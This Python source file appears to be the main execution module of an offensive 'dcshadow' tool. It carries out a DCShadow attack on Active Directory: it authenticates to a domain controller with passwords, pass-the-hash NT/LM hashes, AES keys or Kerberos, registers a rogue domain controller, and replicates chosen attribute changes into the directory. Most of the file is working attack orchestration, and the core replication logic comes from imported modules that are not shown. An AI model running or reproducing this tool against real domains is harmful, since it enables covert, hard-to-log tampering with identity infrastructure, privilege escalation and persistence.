from typing import List

from R2Log import logger
from dcshadow.model.ReplicationObject import ReplicationObject
from dcshadow.manager.ReplicationManager import ReplicationManager
from dcshadow.manager.SessionsManager import SessionsManager


class ExecManager:
    __repl_objects: List[ReplicationObject] = []
    __repl_manager: ReplicationManager = None

    @classmethod
    def main(cls, args):
        """main console entrypoint"""
        logger.verbose("Initializing LDAP connection")
        SessionsManager().initiate_ldap(domain=args.domain, username=args.user, password=args.password, lm_hash=args.lm_hash, nt_hash=args.nt_hash, aes_key=args.aes_key, kerberos=args.use_kerberos, dc_ip=args.dc_ip, use_ldaps=args.use_ldaps)

        logger.verbose("Initializing and verifying the list of modifications to replicate")
        cls.__repl_objects = ReplicationObject.builder(repl_object=args.repl_object, repl_object_dn=args.repl_object_dn, repl_attribute=args.repl_attribute, repl_value=args.repl_value, json_path=args.repl_json)
        logger.success("List of changes ready for replication")

        logger.verbose("Initializing DRS connection")
        SessionsManager().initiate_drs(domain=args.domain, username=args.user, password=args.password, lm_hash=args.lm_hash, nt_hash=args.nt_hash, aes_key=args.aes_key, dc_ip=args.dc_ip)

        logger.info("Preparing environment for replication")
        cls.__repl_manager = ReplicationManager(legit_dc_fqdn=args.legit_dc_fqdn, rogue_dc_name=args.rogue_dc_name, rogue_dc_domain=args.domain)

        cls.__repl_manager.checkChanges(objects=cls.__repl_objects)
        logger.info("Starting the replication process")
        cls.__repl_manager.replicate()
        cls.__repl_manager.checkChanges(objects=cls.__repl_objects)

    @classmethod
    def finished_replication(cls):  # FIXME This function seems to be called twice for some reason, need to implement a state and print the message once it changes to finished?
        logger.success(f"Finished replication")

    def get_repl_objects(self):
        if self.__repl_objects is None:
            raise ValueError("Replication Objects have not been initialized yet!")
        return self.__repl_objects

    def get_repl_manager(self):
        if self.__repl_manager is None:
            raise ValueError("Replication Manager has not been initialized yet!")
        return self.__repl_manager
